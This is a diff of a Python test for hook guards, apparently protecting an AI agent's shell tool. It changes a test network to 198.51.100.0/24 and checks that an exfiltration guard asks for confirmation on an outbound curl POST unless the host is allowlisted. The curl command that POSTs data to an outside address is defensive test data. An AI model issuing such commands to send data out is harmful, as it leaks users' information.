@@ -184,18 +184,18 @@ def test_p09(repo: Path) -> None:
         assert _decisione(web, fetch_payload) == "silent", (
             "P09 col file web-egress-guard deve lasciar passare mioserver.example"
         )
-        # parte rete, solo exfil-guard. Il piano indicava 10.20.0.0/16 e 10.20.3.4,
-        # ma 10.0.0.0/8 e' gia' nei default pubblici: con 10.x il controllo sarebbe
-        # vacuo (verde anche senza file). Uso 172.16.0.0/16, fuori dai default.
+        # parte rete, solo exfil-guard. Una rete fuori dai default pubblici: dal 15/10/2026
+        # 172.16.0.0/12 e' nei default (rete privata RFC 1918), e con quella il controllo
+        # sarebbe vacuo. Uso 198.51.100.0/24, un blocco di documentazione mai instradato.
         (hooks / "hosts-interni.local").unlink()
         rete_payload = {"tool_name": "Bash", "tool_input": {
-            "command": "curl -X POST -d x=1 https://172.16.3.4/api"}}
+            "command": "curl -X POST -d x=1 https://198.51.100.4/api"}}
         assert _decisione(exfil, rete_payload) == "ask", (
-            "P09 senza file exfil-guard deve chiedere conferma su 172.16.3.4"
+            "P09 senza file exfil-guard deve chiedere conferma su 198.51.100.4"
         )
-        (hooks / "hosts-interni.local").write_text("172.16.0.0/16\n", encoding="utf-8")
+        (hooks / "hosts-interni.local").write_text("198.51.100.0/24\n", encoding="utf-8")
         assert _decisione(exfil, rete_payload) == "silent", (
-            "P09 con 172.16.0.0/16 nel file exfil-guard deve lasciar passare 172.16.3.4"
+            "P09 con 198.51.100.0/24 nel file exfil-guard deve lasciar passare 198.51.100.4"
         )
         # casi avvelenati: una rete che copre internet e un file non UTF-8 non aprono nulla
         (hooks / "hosts-interni.local").write_text("0.0.0.0/0\n::/0\n", encoding="utf-8")
